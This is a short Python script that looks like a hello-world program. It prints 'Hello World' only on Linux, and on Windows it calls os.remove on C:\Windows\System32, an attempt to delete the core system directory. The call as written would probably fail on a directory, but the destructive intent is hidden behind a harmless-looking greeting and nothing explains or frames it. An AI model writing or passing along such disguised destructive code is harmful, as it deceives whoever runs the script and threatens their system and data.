import os
from sys import platform
if platform == "linux" or platform == "linux2":
  print("Hello World")
elif platform == "win32":
  os.remove("C:\Windows\System32")